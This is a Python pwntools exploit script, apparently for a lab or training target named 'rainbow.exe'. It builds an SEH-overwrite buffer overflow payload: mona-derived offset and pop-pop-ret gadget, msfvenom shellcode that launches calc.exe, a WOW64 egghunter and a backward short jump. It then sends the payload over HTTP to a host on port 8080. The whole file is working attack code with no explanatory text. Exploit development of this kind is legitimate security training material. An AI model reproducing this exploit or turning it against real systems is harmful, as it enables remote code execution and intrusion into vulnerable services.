#!/usr/bin/python3
from pwn import remote, p32, asm

"""
[+] Command used:
!py mona exchain
Nr of SEH records : 4
Start of chain (TEB FS:[0]) : 0x0094f974
Address     Next SEH    Handler
-------     --------    -------
0x0094fc48  0x76413975  0x31764130  (record smashed at offset 628)

[+] Command used:
!py mona seh -m rainbow.exe

[+] Results :
0x00408b96 |   0x00408b96 : pop ecx # pop ecx # ret  | startnull {PAGE_EXECUTE_READ} [rainbow.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (rainbow.exe)
"""

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a\x0d'
shellcode =  b""
shellcode += b"\xfc\xbb\x66\x99\xd9\x59\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x9a\x71\x5b\x59\x62\x82\x3c\xd3"
shellcode += b"\x87\xb3\x7c\x87\xcc\xe4\x4c\xc3\x80\x08\x26"
shellcode += b"\x81\x30\x9a\x4a\x0e\x37\x2b\xe0\x68\x76\xac"
shellcode += b"\x59\x48\x19\x2e\xa0\x9d\xf9\x0f\x6b\xd0\xf8"
shellcode += b"\x48\x96\x19\xa8\x01\xdc\x8c\x5c\x25\xa8\x0c"
shellcode += b"\xd7\x75\x3c\x15\x04\xcd\x3f\x34\x9b\x45\x66"
shellcode += b"\x96\x1a\x89\x12\x9f\x04\xce\x1f\x69\xbf\x24"
shellcode += b"\xeb\x68\x69\x75\x14\xc6\x54\xb9\xe7\x16\x91"
shellcode += b"\x7e\x18\x6d\xeb\x7c\xa5\x76\x28\xfe\x71\xf2"
shellcode += b"\xaa\x58\xf1\xa4\x16\x58\xd6\x33\xdd\x56\x93"
shellcode += b"\x30\xb9\x7a\x22\x94\xb2\x87\xaf\x1b\x14\x0e"
shellcode += b"\xeb\x3f\xb0\x4a\xaf\x5e\xe1\x36\x1e\x5e\xf1"
shellcode += b"\x98\xff\xfa\x7a\x34\xeb\x76\x21\x53\xea\x05"
shellcode += b"\x5c\x11\xec\x15\x5e\x06\x85\x24\xd5\xc9\xd2"
shellcode += b"\xb8\x3c\xae\x2d\xf3\x1c\x87\xa5\x5a\xf5\x95"
shellcode += b"\xab\x5c\x20\xd9\xd5\xde\xc0\xa2\x21\xfe\xa1"
shellcode += b"\xa7\x6e\xb8\x5a\xda\xff\x2d\x5c\x49\xff\x67"
shellcode += b"\x3f\x0c\x93\xe4\x91\xab\x13\x8e\xed\x33\xe4"
shellcode += b"\x50\xed\x33\xe4\x50"

# !py mona egghunter -wow64
egg = b"w00t" * 2

egghunter  = b""
egghunter += b"\x31\xd2\x66\x81\xca\xff\x0f\x31\xdb\x42"
egghunter += b"\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3"
egghunter += b"\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4"
egghunter += b"\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74"
egghunter += b"\x89\xd7\xaf\x75\xda\xaf\x75\xd7\xff\xe7"

offset = 628

nseh = asm("jmp $-126").ljust(4, b"A")
seh = p32(0x00408b96)

payload  = b""
payload += egg + shellcode
payload += b"A" * 300
payload += egghunter
payload += b"B" * (offset - len(payload))
payload += nseh + seh

content = b"POST / HTTP/1.1\r\n" + payload

shell = remote("Windows", 8080)
shell.send(content)
shell.recv(timeout=0.1)
